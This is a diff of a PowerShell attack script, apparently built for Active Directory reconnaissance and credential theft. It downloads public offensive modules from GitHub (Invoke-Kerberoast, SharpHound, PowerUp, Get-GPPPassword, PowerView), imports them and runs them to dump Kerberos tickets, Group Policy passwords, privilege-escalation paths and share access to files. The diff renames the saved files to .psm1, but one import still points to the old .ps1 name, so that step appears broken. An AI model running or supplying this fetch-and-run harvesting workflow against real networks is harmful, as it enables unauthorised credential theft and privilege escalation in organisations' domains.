@@ -39,10 +39,10 @@ If(!(test-path $modulepath/Kerberoast))
 #download Kerberoast
 Write-Host "Fetching Kerberoast module..."
 $client = New-Object System.Net.WebClient
-$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","$modulepath/Kerberoast/Kerberoast.ps1")
+$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","$modulepath/Kerberoast/Kerberoast.psm1")
 #Run Kerberoast
 Write-Host "Importing module..." 
-Import-Module Kerberoast.ps1
+Import-Module Kerberoast.psm1
 Write-Host "Running Kerberoast" -ForegroundColor  Yellow
 Invoke-Kerberoast | Out-File $path\Kerberoast.krb 
 
@@ -57,9 +57,9 @@ $download = (New-Object System.Net.WebClient).DownloadString("https://raw.github
 $Encode = [System.Text.Encoding]::Unicode.GetBytes(($download))
 $Base64 = [Convert]::ToBase64String($Encode)
 $Decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Base64))
-$Decoded > $modulepath/Sharp/Sharp.ps1
+$Decoded > $modulepath/Sharp/Sharp.psm1
 Write-Host "Importing module..." 
-Import-Module Sharp.ps1
+Import-Module Sharp.psm1
 Write-Host "Running SharpHound" -ForegroundColor  Yellow
 Invoke-BloodHound -CSVFolder $path | Out-Null
 #>
@@ -83,7 +83,7 @@ If(!(test-path $modulepath/PrivEsc))
 }
 Write-Host "Fetching PowerUp module..."
 $client = New-Object System.Net.WebClient
-$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1","$modulepath/PrivEsc/PrivEsc.ps1")
+$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1","$modulepath/PrivEsc/PrivEsc.psm1")
 Write-Host "Importing module..."
 Import-Module PrivEsc.ps1
 Write-Host "Checking for Privilege Escalation paths...." -ForegroundColor Yellow
@@ -97,10 +97,10 @@ If(!(test-path $modulepath/GPP))
 #check for GPP passwords
 Write-Host "Fetching GPPP module..." 
 $client = New-Object System.Net.WebClient
-$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1","$modulepath/GPP/GPP.ps1")
+$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1","$modulepath/GPP/GPP.psm1")
 #import module
 Write-Host "Importing module..." 
-Import-Module gpp.ps1
+Import-Module gpp.psm1
 #Run GPP. Verbose enabled so you know it's actually working or not
 Write-Host "Checking for GPP Passwords, this usually takes a few minutes." -ForegroundColor Yellow
 Get-GPPPassword -Verbose | Out-File $path\gpp.txt 
@@ -112,9 +112,9 @@ If(!(test-path $modulepath/PowerView))
 }
 Write-Host "Fetching PowerView module..." 
 $client = New-Object System.Net.WebClient
-$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1","$modulepath/PowerView/PowerView.ps1")
+$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1","$modulepath/PowerView/PowerView.psm1")
 Write-Host "Importing module..."
-Import-Module PowerView.ps1
+Import-Module PowerView.psm1
 Write-Host "Searching for SMB Shares..." -ForegroundColor Yellow
 Invoke-ShareFinder -CheckShareAccess -Threads 20 | Out-File $path\ShareFinder.txt
 Write-Host "Looking for sensitive files (Grab a coffee, this might take awhile)" -ForegroundColor Yellow
